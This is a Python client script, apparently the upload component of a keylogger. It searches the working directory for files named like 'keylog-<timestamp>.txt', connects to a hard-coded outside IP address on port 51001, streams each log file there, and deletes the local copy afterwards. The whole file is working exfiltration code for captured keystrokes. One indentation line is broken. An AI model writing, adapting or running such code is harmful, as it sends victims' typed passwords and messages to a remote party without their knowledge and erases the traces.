import socket
import os
import re
import errno
#import urllib.request
from sys import exit

if __name__ == "__main__":
    BUFFER_SIZE = 4096 # send 4096 bytes each time step
    # the ip address or hostname of the server, the receiver
    #host = socket.gethostname()
    host = '98.208.17.74'

    port = 51001
    #regex pattern searching
    rootdir = os.getcwd()
    pattern = re.compile("^keylog-\d{4}-\d{2}-\d{2}-\d{6}_\d{4}-\d{2}-\d{2}-\d{6}\.txt$")

    # create the client socket
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    print(f"[+] Connecting to {host}:{port}")
    try:
        s.connect((host, port))
    except socket.error as err:
        print("error while connecting :: %s" % err)

    print("[+] Connected.\n")

    while True:   
        for root, dirs, files in os.walk(rootdir):
            for file in files:
                if pattern.match(file):
                    # the name of file we want to send, make sure it exists
                    print("Found matching filename\n")
                    filename = file
                    break
            else:
                print("closing client socket\n")
                s.close()
                print("exiting client.py code\n")
                exit(0)        
            break

        # send the filename
        try:
            s.send(f"{filename}".encode())
        except IOError as err:
            if err.errno == errno.EPIPE:
                print("PIPE ERROR 1")
                pass
        print("sent the filename: ", filename, "\n")
        # start sending the file
        with open(filename, "rb") as f:
            while True:
                # read the bytes from the file
                bytes_read = f.read(BUFFER_SIZE)
                print("read into file: ", bytes_read, "\n")
                if not bytes_read:
                    print("0 bytes detected, closing file\n")
                    # file transmitting is done
                    f.close()
                    print("file closed\n")
                    os.remove(filename)
                    print("file removed\n")
                    break
                # we use sendall to assure transimission in 
                # busy networks
                try:
                    s.send(bytes_read)
                except IOError as e:
                if e.errno == errno.EPIPE:
                        print("PIPE ERROR 2")
                        pass 
                print("sent ", bytes_read, " bytes.\n")
                # update the progress bar
                #progress.update(len(bytes_read))
